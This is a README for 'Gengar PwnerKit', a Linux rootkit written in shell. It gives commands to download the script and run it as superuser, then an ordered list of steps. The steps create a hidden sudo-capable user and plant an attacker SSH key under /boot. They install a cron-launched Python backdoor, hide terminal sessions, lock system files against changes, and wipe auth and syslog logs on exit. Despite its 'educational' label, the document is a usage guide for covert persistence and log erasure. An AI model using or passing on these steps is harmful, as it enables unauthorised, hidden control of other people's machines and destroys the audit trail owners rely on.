```
             ╔════════════════════════════════════════════════════════════════╗
             ║        ________                           __________           ║ 
             ║       /  _____/  ____   ____    _________ \______   \          ║ 
             ║      /   \  ____/ __ \ /    \  / ___\__  \ |       _/          ║ 
             ║      \    \_\  \  ___/|   |  \/ /_/  > __ \|    |   \          ║ 
             ║       \______  /\___  >___|  /\___  (____  /____|_  /          ║
             ║              \/     \/     \//_____/     \/       \/           ║
             ║    __________                             ____  __.__  __      ║
             ║    \______   \__  _  ______   ___________|    |/ _|__|/  |_    ║
             ║     |     ___/\ \/ \/ /    \_/ __ \_  __ \      < |  \   __\   ║
             ║     |    |     \     /   |  \  ___/|  | \/    |  \|  ||  |     ║
             ║     |____|      \/\_/|___|  /\___  >__|  |____|__ \__||__|     ║
             ║                           \/     \/              \/            ║
             ║                            By H0ru                             ║
             ║                                                                ║
             ╚════════════════════════════════════════════════════════════════╝
```
# Gengar PwnerKit
> * A rootkit written in shell
> * Developed for educational purposes
> * Read the script code to understand more
---

## Summary
> * [Structure](#structure)
> * [How to install?](#how-to-install)
> * [How to use?](#how-to-use)
> * [Plus](#plus)
---

## Structure
> ### This rootkit was structured in 10 options, that are:
> ```
> 1) PWN       3) SSH CONFIG   5) RESET SSH    7) BACKDOOR     9) CLEAR
> 2) CHECKER   4) SSH KEYS     6) HARDENING    8) HIDE        10) EXIT
> ```
> **1 - Pwner option**\
> **1 - Checker option**\
> **3 - SSH options**\
> **1 - Hardener option**\
> **1 - Backdoor option**\
> **1 - Hide option**\
> **2 - Extra options**
---

## How to install?
> - **Git: `git clone https://github.com/h0ru/gpk.git`**
> - **Curl/Wget: `curl/wget https://raw.githubusercontent.com/h0ru/gpk/main/gpk -O gpk `**
---

## How to use?
> ### Once you have downloaded the script run `chmod +x gpk` and run it as super user
> ### Note: **The first command of the script "`mv ./gpk /bin/gpk 2>/dev/null`" moves it to /bin, making it easier to call it.**
> ### Important: Change the lines at 259: `#port` and 274: `#password` for your preferences
> ### Run the options in this order:
> - **`1 ➠ 3 ➠ 4 ➠ 5 ➠ 6 ➠ 7 ➠ 8`**
> 
> ### Option 1: 
> - Create a Backups user and give it a password, add backups   ALL=(ALL:ALL) ALL to /etc/sudoers;
> - Give the backup group the hidepid=2;
> - Etc
>
> ### Option 3: 
> - Change SSH port to 59639;
> - Change session settings and number of attempts;
> - Remove root access to SSH; 
> - Routes the only allowed access key;
> - Etc
>
> ### Option 4:
> - In your machine run: ssh-keygen -t [dsa | ecdsa | ecdsa-sk | ed25519 | ed25519-sk | rsa], to create the ssh keys;
> - Remember to add a password to the key;
> - Then use: cat ~/.ssh/*.pub, copy the beginning of the key to the end of its structure;
> - Paste the key in rootkit screen;
> - Note that your key is located at /boot/model-generic;
> - Etc
>
> ### Option 5:
> - Do not skip this part and if it takes a while, wait
>
> ### Option 6:
> - Block /etc/sudoers, /etc/passwd and /etc/ssh/sshd_config
>
> ### Option 7:
> - Create a file called networker, to create the backdoor code in python 3
> - Compile the backdoor using py_compile;
> - Create a crontab to run the backdoor;
> - Etc
>
> ### Option 8:
> - Hide the pts using mount
> - Etc
>
> ### Options: 2, 9 and 10:
> - The option "CHECKER" check: System Partitions, Crontab, Shell Users, Super Users and SSH Keys;
> - The option "CLEAR" just resets the display screen and banner;
> - And the option "EXIT" sends a "/dev/null" to /var/log/auth.log, /var/log/syslog and exits the rootkit
---

## Plus
> ### Programs used in the Gengar PwnerKit framework:
> #### [¹Touch](https://linux.die.net/man/1/touch)
> #### [²Echo](https://linux.die.net/man/1/echo)
> #### [³Sed](https://linux.die.net/man/1/sed)
> #### [⁴Shered](https://linux.die.net/man/1/shred)
> #### [⁵Mount](https://linux.die.net/man/8/mount)
> #### [⁶Chmod](https://linux.die.net/man/1/chmod)
> #### [⁷Chattr](https://linux.die.net/man/1/chattr)
> #### [⁸Python](https://linux.die.net/man/1/python)
> ---
> #### [Wilipedia - Shell Script](https://en.wikipedia.org/wiki/Shell_script)
> #### [Wikipedia - Rootkit](https://en.wikipedia.org/wiki/Rootkit)
---
